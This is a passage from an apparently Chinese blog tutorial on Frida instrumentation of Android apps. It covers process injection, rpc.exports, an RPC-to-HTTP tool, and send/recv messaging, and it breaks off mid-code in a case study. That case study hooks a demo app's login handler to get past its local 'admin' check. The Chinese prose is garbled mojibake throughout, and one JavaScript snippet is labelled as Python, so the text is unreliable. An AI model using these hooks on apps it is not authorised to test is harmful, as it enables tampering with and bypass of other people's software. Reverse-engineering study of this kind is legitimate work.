href="https://blog.csdn.net/airuozhaoyang/article/details/110789942">https://bbs.pediy.com/thread-258513.htm</a></p><h3 id="åŸºç¡€Fridaä»£ç å®Œæˆ"><a href="#åŸºç¡€Fridaä»£ç å®Œæˆ" class="headerlink" title="åŸºç¡€Fridaä»£ç å®Œæˆ"></a>åŸºç¡€Fridaä»£ç å®Œæˆ</h3><p>frida ä»£ç æç¤ºæ’ä»¶ã€‚å¦‚æœä½ å®‰è£…äº† Frida, ä¸ç®¡ä½ ç†Ÿä¸ç†Ÿæ‚‰ nodejs çš„ç”Ÿæ€, è‚¯å®šå·²ç»å®‰è£…å¥½äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">npm install @types/frida-gum</span><br></pre></td></tr></table></figure><p>ä½ éœ€è¦åœ¨ä½ ç¼–å†™æ³¨å…¥ js æ–‡ä»¶çš„ç›®å½•ä¸‹è¿è¡Œ ( å¯ä»¥ä¸äº‹å…ˆåˆ›å»º package.jsonï¼Œåªæ˜¯ä¼šå‡ºç°ä¸€æ¡è­¦å‘Š )</p><p>ç„¶åä½¿ç”¨å¯ä»¥TypeScriptä»£ç å®ŒæˆåŠŸèƒ½çš„ç¼–è¾‘å™¨ ( æ¯”å¦‚ vscodeã€pycharmã€idea ) æ‰“å¼€jsæ–‡ä»¶å³åˆ»ã€‚</p><p>â€œ<strong>åŸºç¡€ frida ä»£ç å®Œæˆ</strong>â€œ å°±å¯ä»¥è¡¥å…¨ frida js ä»£ç ï¼Œå¦‚æœæƒ³è¦ ç±»æˆå‘˜å‡½æ•°åŠæˆå‘˜å˜é‡çš„ç±»å‹ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å®‰è£…æ’ä»¶ <strong>frida-tsplugin</strong> </p><h3 id="ä¸‹è½½å¹¶å®‰è£…æ’ä»¶-frida-tsplugin"><a href="#ä¸‹è½½å¹¶å®‰è£…æ’ä»¶-frida-tsplugin" class="headerlink" title="ä¸‹è½½å¹¶å®‰è£…æ’ä»¶ frida-tsplugin"></a>ä¸‹è½½å¹¶å®‰è£…æ’ä»¶ <strong>frida-tsplugin</strong></h3><p>åœ¨ä»»æ„ç›®å½•ä¸‹ï¼š<strong>git clone <a href="https://github.com/tacesrever/frida-tsplugin">https://github.com/tacesrever/frida-tsplugin</a></strong> ï¼Œç„¶ååœ¨ frida-tsplugin ç›®å½•ä¸‹è¿è¡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm run <span class="built_in">compile</span></span><br></pre></td></tr></table></figure><h3 id="Frida-tsplugin-ç‰¹æ€§"><a href="#Frida-tsplugin-ç‰¹æ€§" class="headerlink" title="Frida-tsplugin ç‰¹æ€§"></a><strong>Frida-tsplugin</strong> ç‰¹æ€§</h3><ol><li>å¯ä»¥è¯†åˆ« Java.use å’Œ Java.cast</li><li>å¯ä»¥è¿½è¸ªå˜é‡èµ‹å€¼ä¼ é€’</li><li>å¯ä»¥è¯†åˆ«å¹¶è¿½è¸ªç±»æˆå‘˜å‡½æ•°åŠæˆå‘˜å˜é‡çš„ç±»å‹</li><li>å¯ä»¥æ ¹æ®é‡è½½å‡½æ•°çš„å‚æ•°ç±»å‹è¯†åˆ«å¯¹åº”çš„é‡è½½å‡½æ•°</li><li>å¯ä»¥è¯†åˆ« <code>someJavaFunction[.overload(...)].implementation = function(...) &#123;...&#125;</code> å‡½æ•°å—ä¸­çš„å‚æ•°ç±»å‹å’Œthisç±»å‹</li></ol><p>ps. å¯¹äºæœªèƒ½è¿½è¸ªåˆ°çš„ç±»å‹, å¯ä»¥ä½¿ç”¨ Java.cast æ¥ä¸ºå…¶åšä¸€ä¸ªå£°æ˜</p><h1 id="0x01-ç®€å•ä»‹ç»"><a href="#0x01-ç®€å•ä»‹ç»" class="headerlink" title="0x01 ç®€å•ä»‹ç»"></a>0x01 ç®€å•ä»‹ç»</h1><h2 id="è·å–è®¾å¤‡"><a href="#è·å–è®¾å¤‡" class="headerlink" title="è·å–è®¾å¤‡"></a>è·å–è®¾å¤‡</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># æ— çº¿è¿æ¥</span></span><br><span class="line"><span class="comment"># /data/local/tmp/frida-server -l 0.0.0.0:6666</span></span><br><span class="line"><span class="comment"># Wifi ADBç›‘å¬IPå’Œç«¯å£ä¸º192.168.2.111:5555</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.2.111:6666&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰çº¿è¿æ¥</span></span><br><span class="line">device = frida.get_usb_device()</span><br></pre></td></tr></table></figure><h2 id="æ³¨å…¥è¿›ç¨‹"><a href="#æ³¨å…¥è¿›ç¨‹" class="headerlink" title="æ³¨å…¥è¿›ç¨‹"></a>æ³¨å…¥è¿›ç¨‹</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># spawnæ–¹å¼æ³¨å…¥è¿›ç¨‹</span></span><br><span class="line">pid = device.spawn([<span class="string">&#x27;com.example.luodemo&#x27;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># attachæ¨¡å¼æ³¨å…¥è¿›ç¨‹</span></span><br><span class="line">session = device.attach(<span class="string">&#x27;com.example.luodemo&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="æ³¨å…¥è„šæœ¬"><a href="#æ³¨å…¥è„šæœ¬" class="headerlink" title="æ³¨å…¥è„šæœ¬"></a>æ³¨å…¥è„šæœ¬</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">script = session.create_script(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">setImmediate(Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    console.log(&#x27;hello python frida&#x27;)</span></span><br><span class="line"><span class="string">&#125;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) <span class="comment">#è¯»å…¥Hookè„šæœ¬å†…å®¹</span></span><br><span class="line"></span><br><span class="line">script.load() <span class="comment">#å°†è„šæœ¬åŠ è½½è¿›è¿›ç¨‹ç©ºé—´ä¸­</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶æ–¹å¼æ³¨å…¥è¿›ç¨‹"><a href="#æ–‡ä»¶æ–¹å¼æ³¨å…¥è¿›ç¨‹" class="headerlink" title="æ–‡ä»¶æ–¹å¼æ³¨å…¥è¿›ç¨‹"></a>æ–‡ä»¶æ–¹å¼æ³¨å…¥è¿›ç¨‹</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;LuoHook.js&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨å‡½æ•°"><a href="#è°ƒç”¨å‡½æ•°" class="headerlink" title="è°ƒç”¨å‡½æ•°"></a>è°ƒç”¨å‡½æ•°</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&#x27;ç›®æ ‡åº”ç”¨åŒ…å&#x27;</span>)</span><br><span class="line">script = session.create_script(<span class="built_in">open</span>(<span class="string">&#x27;myscript.js&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨å¯ä»¥é€šè¿‡ RPC è°ƒç”¨å‡½æ•°</span></span><br><span class="line">result = script.exports.myFunction(arg1, arg2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><h3 id="script-on"><a href="#script-on" class="headerlink" title="script.on"></a>script.on</h3><p>åœ¨ Frida çš„è„šæœ¬ä¸­ä½¿ç”¨ <code>script.on</code> æ–¹æ³•æ˜¯ä¸ºäº†è®¾ç½®ä¸€ä¸ªäº‹ä»¶ç›‘å¬å™¨ï¼Œå®ƒå…è®¸ä½ æ•è·å¹¶å¤„ç†è„šæœ¬ä¸­å‘å‡ºçš„æ¶ˆæ¯ã€‚è¿™é€šå¸¸ç”¨äºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ol><li><strong>æ¥æ”¶è„šæœ¬ä¸­çš„è¾“å‡º</strong>ï¼šè„šæœ¬å¯ä»¥é€šè¿‡ <code>send</code> æ–¹æ³•å‘é€æ¶ˆæ¯åˆ°é™„åŠ çš„è¿›ç¨‹ï¼ˆä¾‹å¦‚ï¼Œæ‰“å°è°ƒè¯•ä¿¡æ¯æˆ–è€…è¿”å›ç»“æœï¼‰ã€‚</li><li><strong>å¤„ç†è„šæœ¬ä¸­çš„å¼‚å¸¸</strong>ï¼šå¦‚æœè„šæœ¬ä¸­å‘ç”Ÿé”™è¯¯ï¼ŒFrida ä¼šè‡ªåŠ¨å‘é€ä¸€ä¸ªåŒ…å«é”™è¯¯ä¿¡æ¯çš„æ¶ˆæ¯ã€‚</li></ol><p>ä»¥ä¸‹æ˜¯ <code>script.on</code> æ–¹æ³•çš„åŸºæœ¬ç”¨æ³•ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, function(message, data) &#123;</span><br><span class="line">    // message å‚æ•°åŒ…å«æ¶ˆæ¯çš„ç±»å‹å’Œå†…å®¹</span><br><span class="line">    // data å‚æ•°åŒ…å«ä¸æ¶ˆæ¯ç›¸å…³çš„åŸå§‹æ•°æ®ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message.<span class="built_in">type</span> === <span class="string">&#x27;send&#x27;</span>) &#123;</span><br><span class="line">        // å¤„ç†è„šæœ¬é€šè¿‡ send æ–¹æ³•å‘é€çš„æ¶ˆæ¯</span><br><span class="line">        console.log(<span class="string">&quot;Received message from script:&quot;</span>, message.payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (message.<span class="built_in">type</span> === <span class="string">&#x27;error&#x27;</span>) &#123;</span><br><span class="line">        // å¤„ç†è„šæœ¬ä¸­çš„é”™è¯¯</span><br><span class="line">        console.log(<span class="string">&quot;Script reported an error:&quot;</span>, message.description);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>message</code> å¯¹è±¡é€šå¸¸å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š</p><ul><li><code>type</code>ï¼šæ¶ˆæ¯ç±»å‹ï¼Œå¯ä»¥æ˜¯ <code>&#39;send&#39;</code>ã€<code>&#39;error&#39;</code> æˆ– <code>&#39;console&#39;</code>ã€‚</li><li><code>payload</code>ï¼šå½“æ¶ˆæ¯ç±»å‹æ˜¯ <code>&#39;send&#39;</code> æ—¶ï¼Œè¿™æ˜¯è„šæœ¬å‘é€çš„å®é™…æ•°æ®ã€‚</li><li><code>description</code>ï¼šå½“æ¶ˆæ¯ç±»å‹æ˜¯ <code>&#39;error&#39;</code> æ—¶ï¼Œè¿™æ˜¯é”™è¯¯æè¿°ã€‚</li></ul><p><code>data</code> å‚æ•°é€šå¸¸æ˜¯ä¸€ä¸ªåŒ…å«åŸå§‹æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œç¼“å†²åŒºï¼‰çš„å¯¹è±¡ï¼Œå®ƒä»…åœ¨æ¶ˆæ¯ç±»å‹æ˜¯ <code>&#39;send&#39;</code> æ—¶æœ‰æ„ä¹‰ã€‚</p><p>ä½¿ç”¨ <code>script.on</code> æ–¹æ³•ï¼Œä½ å¯ä»¥ç¡®ä¿åœ¨è„šæœ¬è¿è¡Œæ—¶èƒ½å¤Ÿæ¥æ”¶å’Œå¤„ç†ä»»ä½•é‡è¦çš„é€šçŸ¥æˆ–æ•°æ®ï¼Œä»è€Œå®ç°ä¸è„šæœ¬çš„äº¤äº’ã€‚è¿™åœ¨è°ƒè¯•å’Œä¸è„šæœ¬è¿›è¡Œé€šä¿¡æ—¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="rpc-exports"><a href="#rpc-exports" class="headerlink" title="rpc.exports"></a>rpc.exports</h3><p><code>rpc.exports</code> æ˜¯åœ¨ Frida è„šæœ¬ä¸­ä½¿ç”¨çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒç”¨äºå®šä¹‰å¯ä»¥ä»å¤–éƒ¨é€šè¿‡ RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰è°ƒç”¨çš„å‡½æ•°ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å¯ä»¥å°† Frida è„šæœ¬ä¸­çš„æŸäº›åŠŸèƒ½æš´éœ²ç»™å¤–éƒ¨ç¨‹åºï¼Œä½¿å¾—å¤–éƒ¨ç¨‹åºå¯ä»¥è¿œç¨‹æ‰§è¡Œè¿™äº›åŠŸèƒ½ã€‚</p><p>ä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨ <code>rpc.exports</code> çš„åŸºæœ¬æ­¥éª¤ï¼š</p><p><strong>ç¬¬ä¸€ç§æ–¹å¼</strong>ï¼Œå‡½æ•°ç›´æ¥åµŒå¥—åœ¨RPCå¯¼å‡ºä¸­ï¼Œç›´æ¥å¯¼å‡ºã€‚</p><p>test.jsä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">hello</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">failPlease</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;oops&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pythonä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;è®¾ç½®&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">api = script.exports</span><br><span class="line"><span class="built_in">print</span>(api.hello())</span><br><span class="line"><span class="built_in">print</span>(api.fail_please())</span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒç§æ–¹å¼</strong>ï¼Œå…ˆå†™å‡½æ•°åœ¨ RPC ï¼Œç„¶åå¯¼å‡ºã€‚</p><p>test.js ä»£ç </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">failPlease</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;oops&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">hi</span>: hello,</span><br><span class="line">    <span class="attr">fail</span>: failPlease</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pythonä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;è®¾ç½®&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">api = script.exports</span><br><span class="line"><span class="built_in">print</span>(api.hi())</span><br><span class="line"><span class="built_in">print</span>(api.fail())</span><br></pre></td></tr></table></figure><h1 id="0x02-ARIDA-ç®¡ç†PRCè„šæœ¬-è‡ªåŠ¨ç”Ÿæˆ-http-æ¥å£çš„å·¥å…·"><a href="#0x02-ARIDA-ç®¡ç†PRCè„šæœ¬-è‡ªåŠ¨ç”Ÿæˆ-http-æ¥å£çš„å·¥å…·" class="headerlink" title="0x02 ARIDA-ç®¡ç†PRCè„šæœ¬&amp;è‡ªåŠ¨ç”Ÿæˆ http æ¥å£çš„å·¥å…·"></a>0x02 ARIDA-ç®¡ç†PRCè„šæœ¬&amp;è‡ªåŠ¨ç”Ÿæˆ http æ¥å£çš„å·¥å…·</h1><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/tcc0lin/arida">GitHub - tcc0lin&#x2F;arida: åŸºäºFastAPIå®ç°çš„Frida-RPCå·¥å…·ï¼Œè‡ªåŠ¨è§£æJavaScriptæ–‡ä»¶ç”Ÿæˆå¯¹åº”APIæ¥å£</a></p><h2 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h2><p><code>Python</code>æ‰§è¡Œ<code>PyexecJs</code>é€šè¿‡<code>Jsçš„ASTæ ‘</code>ç»“æ„è·å–<code>Frida-Js</code>è„šæœ¬ä¸­<code>rpc.exports</code>çš„æ–¹æ³•ä»¥åŠå¯¹åº”æ–¹æ³•çš„å‚æ•°ä¸ªæ•°ï¼Œæ ¹æ®æ–¹æ³•åå’Œå‚æ•°ä¸ªæ•°é€šè¿‡<code>types.FunctionDef</code>ä»<code>Python ASTå­—èŠ‚ç </code>æ¥åŠ¨æ€ç”Ÿæˆæ–°çš„<code>Functionå¯¹è±¡</code>ï¼Œå¹¶ä¸”ç»“åˆ<code>pydantic</code>çš„<code>create_model</code>è‡ªåŠ¨ç”Ÿæˆçš„å‚æ•°æ¨¡å‹æ³¨å†Œåˆ°<code>FastAPIçš„è·¯ç”±ç³»ç»Ÿ</code>ä¸­ï¼Œå®ç°<code>Frida-RPC</code>çš„åŠŸèƒ½ã€‚</p><h2 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091433276.png" alt="image.png"> </p><h2 id="æ ¸å¿ƒåŠŸèƒ½"><a href="#æ ¸å¿ƒåŠŸèƒ½" class="headerlink" title="æ ¸å¿ƒåŠŸèƒ½"></a>æ ¸å¿ƒåŠŸèƒ½</h2><ol><li>ç®¡ç†<code>JavaScript</code>æ–‡ä»¶ï¼Œå…·å¤‡<code>APP-æ–‡ä»¶</code>çš„æ˜ å°„å…³ç³»</li><li>è‡ªåŠ¨é’ˆå¯¹ç°æœ‰çš„<code>JavaScript</code>æ–¹æ³•ç”Ÿæˆç›¸åº”çš„<code>API</code>æ–¹æ³•</li><li>è‡ªåŠ¨ç”Ÿæˆ<code>Open API</code>æ–‡æ¡£</li></ol><h2 id="å®‰è£…-ä½¿ç”¨"><a href="#å®‰è£…-ä½¿ç”¨" class="headerlink" title="å®‰è£…&amp;ä½¿ç”¨"></a>å®‰è£…&amp;ä½¿ç”¨</h2><p>å‚è€ƒä¸Šé¢å®˜æ–¹åœ°å€</p><h2 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091434355.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091434379.png" alt="img"> </p><h1 id="0x03-send-recv-wait"><a href="#0x03-send-recv-wait" class="headerlink" title="0x03 send&#x2F;recv&#x2F;wait"></a>0x03 send&#x2F;recv&#x2F;wait</h1><p><a href="https://www.linqi.net.cn/index.php/archives/293/#cl-6">FRIDA RPC - å¥‹æ–—çš„å®‰å“å‹‡å£«Blog (linqi.net.cn)</a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><h3 id="1ã€send"><a href="#1ã€send" class="headerlink" title="1ã€send"></a><strong>1ã€send</strong></h3><ul><li><code>send()</code> å‡½æ•°ç”¨äºä»Fridaè„šæœ¬å‘ä¸»æœºæ§åˆ¶å°å‘é€æ¶ˆæ¯ã€‚</li><li>è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥ä¼ é€’ä»»ä½•å¯ä»¥è¢«åºåˆ—åŒ–çš„æ•°æ®ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹ã€å¯¹è±¡å’Œæ•°ç»„ã€‚</li><li>ä½¿ç”¨ç¤ºä¾‹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send(&#x27;Hello from Frida script!&#x27;);</span><br></pre></td></tr></table></figure><h3 id="2ã€recv"><a href="#2ã€recv" class="headerlink" title="2ã€recv():"></a><strong>2ã€recv()</strong>:</h3><ul><li><code>recv()</code> å‡½æ•°ç”¨äºåœ¨è„šæœ¬ä¸­è®¾ç½®ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†åœ¨ä¸»æœºæ§åˆ¶å°å‘é€æ¶ˆæ¯æ—¶è¢«è°ƒç”¨ã€‚</li><li>ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥å¤„ç†ä»ä¸»æœºæ§åˆ¶å°æ¥æ”¶åˆ°çš„å‘½ä»¤æˆ–æ•°æ®ã€‚</li><li>ä½¿ç”¨ç¤ºä¾‹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">recv(function onData(data) &#123;</span><br><span class="line">    console.log(&#x27;Received data:&#x27;, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="3ã€wait"><a href="#3ã€wait" class="headerlink" title="3ã€wait():"></a><strong>3ã€wait()</strong>:</h3><ul><li><code>wait()</code> å‡½æ•°ç”¨äºæš‚åœè„šæœ¬çš„æ‰§è¡Œï¼Œç›´åˆ°ä¸»æœºæ§åˆ¶å°è°ƒç”¨<code>resume()</code>ã€‚</li><li>è¿™å¯ä»¥ç”¨äºåŒæ­¥æ“ä½œï¼Œå°¤å…¶æ˜¯åœ¨ä½ éœ€è¦ç­‰å¾…æŸä¸ªå¤–éƒ¨äº‹ä»¶æˆ–æ¡ä»¶æ—¶ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wait();</span><br><span class="line">// è„šæœ¬å°†åœ¨è¿™é‡Œæš‚åœï¼Œç›´åˆ°ä¸»æœºæ§åˆ¶å°è°ƒç”¨resume()</span><br></pre></td></tr></table></figure><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><p>è¦å®ç°çš„åŠŸèƒ½æ˜¯ï¼Œæˆ‘ä»¬ä¸ä»…ä»…å¯ä»¥åœ¨<code>kali</code>ä¸»æœºä¸Šè°ƒç”¨å®‰å“<code>app</code>é‡Œçš„å‡½æ•°ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æŠŠæ•°æ®ä»å®‰å“<code>app</code>é‡Œä¼ é€’åˆ°<code>kali</code>ä¸»æœºä¸Šï¼Œåœ¨ä¸»æœºä¸Šè¿›è¡Œä¿®æ”¹ï¼Œå†ä¼ é€’å›å®‰å“<code>app</code>é‡Œé¢å»ã€‚</p><p>ç¼–å†™è¿™æ ·ä¸€ä¸ª<code>app</code>ï¼Œå…¶ä¸­æœ€æ ¸å¿ƒçš„åœ°æ–¹åœ¨äºåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸º<code>admin</code>ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç›´æ¥è¿”å›é”™è¯¯ï¼Œç¦æ­¢ç™»é™†ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™æŠŠç”¨æˆ·å’Œå¯†ç ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šè¿›è¡ŒéªŒè¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        password_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText2);</span><br><span class="line">        username_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText);</span><br><span class="line">        message_tv = ((TextView) findViewById(R.id.textView));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (username_et.getText().toString().compareTo(<span class="string">&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    message_tv.setText(<span class="string">&quot;You cannot login as admin&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message_tv.setText(<span class="string">&quot;Sending to the server :&quot;</span> + Base64.encodeToString((username_et.getText().toString() + <span class="string">&quot;:&quot;</span> + password_et.getText().toString()).getBytes(), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç¨‹åºè¿è¡Œä¹‹åï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091527025.jpeg" alt="img"> </p><p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨<code>kali</code>ä¸»æœºä¸Šâ€œå¾—åˆ°â€è¾“å…¥æ¡†è¾“å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”ä¿®æ”¹å…¶è¾“å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”â€œä¼ è¾“â€ç»™å®‰å“æœºå™¨ï¼Œä½¿å…¶é€šè¿‡éªŒè¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å“ªæ€•è¾“å…¥<code>admin</code>çš„è´¦æˆ·å’Œå¯†ç ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡æœ¬åœ°æ ¡éªŒï¼Œè¿›è¡Œç™»é™†çš„æ“ä½œã€‚</p><p>æ‰€ä»¥æœ€ç»ˆå®‰å“ç«¯çš„<code>js</code>ä»£ç çš„é€»è¾‘å°±æ˜¯ï¼Œæˆªå–è¾“å…¥ï¼Œä¼ è¾“ç»™<code>kali</code>ä¸»æœºï¼Œæš‚åœæ‰§è¡Œï¼Œå¾—åˆ°<code>kali</code>ä¸»æœºä¼ å›çš„æ•°æ®ä¹‹åï¼Œç»§ç»­æ‰§è¡Œã€‚å½¢æˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> tv_class = <span class="title 